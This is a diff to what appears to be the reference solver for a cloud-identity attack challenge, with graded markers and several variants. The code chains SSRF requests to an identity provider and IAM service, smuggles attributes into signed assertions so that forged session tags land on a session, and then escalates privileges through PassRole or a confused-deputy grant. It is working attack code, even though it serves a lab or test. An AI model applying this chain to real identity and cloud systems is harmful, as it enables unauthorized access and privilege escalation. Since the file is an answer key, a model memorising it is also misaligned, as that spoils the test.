@@ -114,49 +114,92 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     family = desc.get("escalation_family")
     fed_family = desc.get("federation_family", "principal-tag")
 
-    def find_condition(d):
+    def find_conditions(d):
+        """Return ALL {tag_key: value} pairs from every trust-condition StringEquals in the tree.
+        (baseline has 1 pair; two_tag has 2 — the second describes an env attribute.)"""
+        out = {}
         if isinstance(d, dict):
             se = d.get("Condition", {}).get("StringEquals") if "Condition" in d else None
             if se:
-                k = next(iter(se))
-                return k.split("/")[-1], se[k]
+                for k, v in se.items():
+                    out[k.split("/")[-1]] = v
             for v in d.values():
-                r = find_condition(v)
-                if r:
-                    return r
-        return None
+                for kk, vv in find_conditions(v).items():
+                    out.setdefault(kk, vv)
+        return out
 
-    tag_name, _ = find_condition(desc)
-    # (a) INJECTION POINT: which caller source attribute does the IdP claim rule map to the honored tag?
-    rules = ssrf(f"{IDP}/idp/claim-rules")["rules"]
-    source_attr = next(r["source"] for r in rules if r["emits_tag"] == tag_name)
-    # (b) VALUE: the project_code of the project owned by the entitled group's team (correlate the catalog)
+    conds = find_conditions(desc)
+    # Baseline / intersection: single project tag. two_tag: adds an env tag (name = whatever the trust
+    # policy lists). `session_tag_source.required_keys` is authoritative under two_tag; when it's absent
+    # (baseline OR intersection alone), fall back to the single project tag and skip the env branch —
+    # do NOT harvest condition keys from unrelated policy layers (permissions boundaries carry their own
+    # StringEquals that look tag-shaped but aren't PrincipalTag conditions).
+    _tag_source = desc.get("session_tag_source") or {}
+    required_keys = _tag_source.get("required_keys")
+    if required_keys is None:
+        project_tag = next(k for k in conds if "project_code" in (conds.get(k) or ""))
+        env_tag = None
+    else:
+        project_tag = next(k for k in required_keys if "project_code" in (conds.get(k) or ""))
+        env_tag = next((k for k in required_keys if k != project_tag), None)
+    # Correlate the directory catalog: single project whose owner_team matches the trust predicate.
     projects = ssrf(f"{DIR}/dir/projects")["projects"]
-    tag_value = next(p["project_code"] for p in projects if p["owner_team"] == owner_team)
-    # (c) inject the SOURCE attribute; the IdP claim rule emits it as the honored tag (its value is ours)
-    smug = {"entitlement": ent, "role": granted_role, "attributes": {source_attr: tag_value}}
+    winning = next(p for p in projects if p["owner_team"] == owner_team)
+    tag_value = winning["project_code"]
+    # (a) INJECTION POINT: which caller source attribute does each IdP claim rule map to?
+    rules = ssrf(f"{IDP}/idp/claim-rules")["rules"]
+    source_attr = next(r["source"] for r in rules if r["emits_tag"] == project_tag)
+    attrs = {source_attr: tag_value}
+    env_value = None
+    if env_tag is not None:  # two_tag active — inject BOTH source attributes
+        env_source_attr = next(r["source"] for r in rules if r["emits_tag"] == env_tag)
+        env_value = winning.get("environment")  # dependent lookup on the same winning project record
+        attrs[env_source_attr] = env_value
+    smug = {"entitlement": ent, "role": granted_role, "attributes": attrs}
     a1 = ssrf(f"{IDP}/idp/assert?p={b64u(smug)}")
     sess1_resp = ssrf(f"{IAM}/iam/session?assertion={a1['assertion']}")
-    marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag actually lands on the session
+    marker(sess1_resp)  # h4 — credited ONLY here, when the smuggled tag(s) actually land on the session
     sess1 = sess1_resp["session"]
-    st.update(tag_name=tag_name, tag_value=tag_value, family=family,
-              fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
+    st.update(tag_name=project_tag, tag_value=tag_value, env_tag=env_tag, env_value=env_value,
+              family=family, fed_family=fed_family, bootstrap_session=sess0, tagged_session=sess1)
 
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
     caps = ssrf(f"{DEP}/deploy/capabilities")
-    acts = caps["workload_actions"]
-    act_read = next(a for a, d in acts.items() if "blob" in d)
-    act_unwrap = next(a for a, d in acts.items() if "unwrap" in d)
+    acts = caps.get("workload_actions")
+    if acts:  # baseline: capabilities describes each action — classify by its served description
+        act_read = next(a for a, d in acts.items() if "blob" in d)
+        act_unwrap = next(a for a, d in acts.items() if "unwrap" in d)
+    else:  # change0: capabilities lists action NAMES only — classify by the (semantic) name
+        names = caps["actions"]
+        act_unwrap = next(a for a in names if any(k in a for k in ("unwrap", "decrypt", "unseal")))
+        act_read = next(a for a in names if a != act_unwrap)
     st.update(act_read=act_read, act_unwrap=act_unwrap)
     if family == "passrole-runas":
         pivot = next(name for name, p in desc["principals"].items()
                      if p.get("trust_policy", {}).get("Condition"))
-        passed = desc["principals"][pivot]["policy"]["PassRole"][0]
+        pivot_entry = desc["principals"][pivot]
+        # INTERSECTION lever: multiple PassRole candidates in identity policy; the pivot role has a
+        # permissions_boundary that caps effective PassRole to a specific Resource ARN + a
+        # iam:PassedToService condition. Winner = identity Allow ∩ boundary Resource. Baseline: single
+        # candidate, no boundary — just take it.
+        _allow = pivot_entry["policy"]["PassRole"]
+        _boundary = pivot_entry.get("permissions_boundary")
+        if _boundary:
+            _boundary_arns = _boundary.get("Resource", [])
+            _boundary_roles = [arn.rsplit("/", 1)[-1] for arn in _boundary_arns]
+            passed = next(r for r in _allow if r in _boundary_roles)
+        else:
+            passed = _allow[0]
         cred = ssrf(f"{IAM}/iam/assume?p={b64u({'session': sess1, 'role': pivot})}")["role_credential"]
         base_req = {"cred": cred, "pass_role": passed}
         st.update(pivot_role=pivot, passed_role=passed, escalation_artifact=base_req)
     else:  # confused-deputy
-        resource = next(iter(desc["resource_policies"]))
+        # INTERSECTION lever: multiple resource policies; pick the one whose Action covers
+        # deployment:SubmitJob (i.e., the deployment workflow the estate is actually reached through).
+        # Baseline: single entry — take it.
+        _rps = desc["resource_policies"]
+        resource = next((r for r, pol in _rps.items()
+                         if pol.get("Action", "").startswith("deployment:")), next(iter(_rps)))
         grant = ssrf(f"{IAM}/iam/grant?p={b64u({'session': sess1, 'resource': resource})}")["job_grant"]
         base_req = {"grant": grant}
         st.update(resource=resource, escalation_artifact=base_req)
